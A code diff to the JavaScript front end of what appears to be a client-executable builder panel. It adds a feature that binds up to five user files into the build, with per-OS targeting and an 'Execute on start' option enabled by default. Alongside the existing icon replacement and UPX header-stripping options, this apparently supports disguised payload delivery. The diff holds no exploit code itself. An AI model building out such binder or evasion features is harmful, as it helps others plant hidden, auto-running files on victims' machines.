@@ -227,6 +227,121 @@ if (iconClear) {
   });
 }
 
+const MAX_BIND_FILES = 5;
+const MAX_BIND_FILE_BYTES = 10 * 1024 * 1024; // 10 MB
+
+let boundFiles = []; // { name, base64, targetOS: string[], execute: boolean }
+
+const bindFileInput = document.getElementById("bind-file-input");
+const bindFilesList = document.getElementById("bind-files-list");
+const bindAddLabel = document.getElementById("bind-add-label");
+
+function sanitizeBindName(name) {
+  return name.replace(/[^A-Za-z0-9._-]/g, "").slice(0, 64) || "file";
+}
+
+function renderBoundFiles() {
+  if (!bindFilesList) return;
+  bindFilesList.innerHTML = "";
+
+  boundFiles.forEach((entry, idx) => {
+    const div = document.createElement("div");
+    div.className = "flex flex-col gap-2 p-3 bg-slate-800/60 border border-slate-700 rounded-lg";
+
+    const osList = ["windows", "linux", "darwin"];
+    const osIcons = { windows: "fa-brands fa-windows", linux: "fa-brands fa-linux", darwin: "fa-brands fa-apple" };
+    const osColors = { windows: "text-blue-400", linux: "text-amber-400", darwin: "text-slate-200" };
+    const osLabels = { windows: "Windows", linux: "Linux", darwin: "macOS" };
+
+    const osCheckboxes = osList
+      .map(
+        (os) =>
+          `<label class="flex items-center gap-1 text-xs cursor-pointer select-none">
+            <input type="checkbox" class="bind-os-cb w-3 h-3" data-idx="${idx}" data-os="${os}"
+              ${entry.targetOS.length === 0 || entry.targetOS.includes(os) ? "checked" : ""} />
+            <i class="${osIcons[os]} ${osColors[os]}"></i> ${osLabels[os]}
+          </label>`,
+      )
+      .join("");
+
+    div.innerHTML = `
+      <div class="flex items-center gap-2">
+        <i class="fa-solid fa-file text-violet-400 shrink-0"></i>
+        <span class="text-sm font-medium text-slate-200 truncate flex-1">${entry.name}</span>
+        <button type="button" class="bind-remove-btn text-red-400 hover:text-red-300 text-xs px-1" data-idx="${idx}" title="Remove">
+          <i class="fa-solid fa-xmark"></i>
+        </button>
+      </div>
+      <div class="flex items-center gap-3 flex-wrap">
+        <span class="text-xs text-slate-500 shrink-0">Run on:</span>
+        ${osCheckboxes}
+        <span class="flex-1"></span>
+        <label class="flex items-center gap-1 text-xs cursor-pointer select-none">
+          <input type="checkbox" class="bind-exec-cb w-3 h-3" data-idx="${idx}" ${entry.execute ? "checked" : ""} />
+          <i class="fa-solid fa-play text-green-400"></i> Execute on start
+        </label>
+      </div>
+    `;
+
+    div.querySelector(".bind-remove-btn").addEventListener("click", () => {
+      boundFiles.splice(idx, 1);
+      renderBoundFiles();
+      updateBindAddVisibility();
+    });
+
+    div.querySelectorAll(".bind-os-cb").forEach((cb) => {
+      cb.addEventListener("change", () => {
+        const checked = Array.from(div.querySelectorAll(`.bind-os-cb[data-idx="${idx}"]`))
+          .filter((el) => el.checked)
+          .map((el) => el.dataset.os);
+        boundFiles[idx].targetOS = checked.length === osList.length ? [] : checked;
+      });
+    });
+
+    div.querySelector(".bind-exec-cb").addEventListener("change", (e) => {
+      boundFiles[idx].execute = e.target.checked;
+    });
+
+    bindFilesList.appendChild(div);
+  });
+}
+
+function updateBindAddVisibility() {
+  if (!bindAddLabel) return;
+  bindAddLabel.classList.toggle("hidden", boundFiles.length >= MAX_BIND_FILES);
+}
+
+if (bindFileInput) {
+  bindFileInput.addEventListener("change", () => {
+    const file = bindFileInput.files[0];
+    bindFileInput.value = "";
+    if (!file) return;
+
+    if (boundFiles.length >= MAX_BIND_FILES) {
+      alert(`Maximum ${MAX_BIND_FILES} files can be bound.`);
+      return;
+    }
+    if (file.size > MAX_BIND_FILE_BYTES) {
+      alert(`Each bound file must be under 10 MB. "${file.name}" is too large.`);
+      return;
+    }
+    const safeName = sanitizeBindName(file.name);
+    if (boundFiles.some((f) => f.name === safeName)) {
+      alert(`A file named "${safeName}" is already in the list.`);
+      return;
+    }
+
+    const reader = new FileReader();
+    reader.onload = () => {
+      const base64 = reader.result.split(",")[1];
+      boundFiles.push({ name: safeName, base64, targetOS: [], execute: true });
+      renderBoundFiles();
+      updateBindAddVisibility();
+    };
+    reader.readAsDataURL(file);
+  });
+}
+
 async function init() {
   try {
     updateServerUrlPlaceholder();
@@ -396,6 +511,9 @@ form?.addEventListener("submit", async (e) => {
     iconBase64: pendingIconBase64 || undefined,
     enableUpx: form.querySelector('input[name="enable-upx"]')?.checked || false,
     upxStripHeaders: form.querySelector('input[name="upx-strip-headers"]')?.checked || false,
+    boundFiles: boundFiles.length > 0
+      ? boundFiles.map((f) => ({ name: f.name, data: f.base64, targetOS: f.targetOS, execute: f.execute }))
+      : undefined,
   };
 
   const hasAndroid = platforms.some(p => p.startsWith('android-'));
